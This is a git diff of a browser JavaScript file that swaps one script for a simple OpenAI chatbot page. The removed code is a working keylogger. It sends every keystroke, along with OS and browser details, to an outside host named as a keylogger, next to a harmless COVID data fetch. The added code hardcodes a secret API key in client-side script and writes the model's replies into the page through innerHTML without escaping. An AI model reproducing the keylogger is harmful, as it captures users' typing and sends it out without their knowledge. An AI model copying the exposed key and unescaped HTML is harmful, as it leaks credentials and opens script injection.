@@ -1,59 +1,52 @@
-async function fetchData() {
-    const res = await fetch ("https://api.coronavirus.data.gov.uk/v1/data");
-    const record = await res.json();
+let api = "https://api.openai.com/v1"
 
-    document.getElementById("date").innerHTML = record.data[0].date;
-    document.getElementById("areaName").innerHTML = record.data[0].areaName;
-    document.getElementById("latestBy").innerHTML = record.data[0].latestBy;
-    document.getElementById("deathNew").innerHTML = record.data[0].deathNew;
-}
+// Select the button element
+const button = document.getElementById("button")
 
-string_key = "";
+// Add a click event listener to the button
+button.addEventListener('click', sendChat)
 
-async function getKey() {
-    document.addEventListener('keydown', async(event) => {
-        let res = await submit("/send", "POST", {
-            time: new Date().toLocaleString(),
-            appName: "gfhjk",
-            key: event.key,
-            type: "Keyboard"
-        })
-        // alert(res)
-        document.getElementById("key").innerHTML=event.key;
-        if (event.key == "Enter")
-            string_key = "";
-        else
-            string_key += event.key;
-        document.getElementById("string").innerHTML=string_key;
+// Define the sendChat function
+// Define the sendChat function
+async function sendChat() {
+    // Prevent the form from submitting
+    event.preventDefault();
+  
+    let chat = document.getElementById("chat_message").value;
+    
+    let res = await fetch("https://api.openai.com/v1/completions", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Authorization": "Bearer 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"
+      },
+      body: JSON.stringify({
+        "model": "text-davinci-003",
+        "prompt": chat,
+        "max_tokens": 2048,
+        "temperature": 0
+      })
     });  
-}
+    UpdateChat("You", chat);
+  
+    res = await res.json();
+    let botResponse = res.choices[0].text;
+    UpdateChat("Bot", botResponse);
+    document.getElementById("chat_message").value = "";
+}  
 
-async function getOS() {
-    const os = {
-        "osName": navigator.platform,
-        "osInfo": navigator.appVersion,
-        "appName": navigator.appName,
-    }
-    document.getElementById("os").innerHTML = JSON.stringify(os);
-    return os;
-}
+async function UpdateChat(sender, message) {
+    // Get the chat element
+    const chat_value = document.querySelector('.chat');
 
-async function submit(parameter, type, data = {}) {
-    const url_base = "https://Keylogger.pzcuong2410.repl.co"
-    let response = await fetch(url_base + parameter, {
-        method: type,
-        headers: {
-            'Content-Type': 'application/json',
-            'Access-Control-Allow-Origin': '*',
-            'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
-            'os_data': JSON.stringify(await getOS())
-        },
-        body: JSON.stringify(data)
-    })
-    response = await response.json()
-    return response;
-}
+    // Create a new message element
+    const newMessage = document.createElement('div');
+    newMessage.classList.add('message');
+    newMessage.innerHTML = `
+        <div class="sender">${sender}</div>
+        <div class="text">${message}</div>
+    `;
 
-fetchData();
-getKey();
-getOS()
+    // Append the new message element to the chat
+    chat_value.appendChild(newMessage);
+}
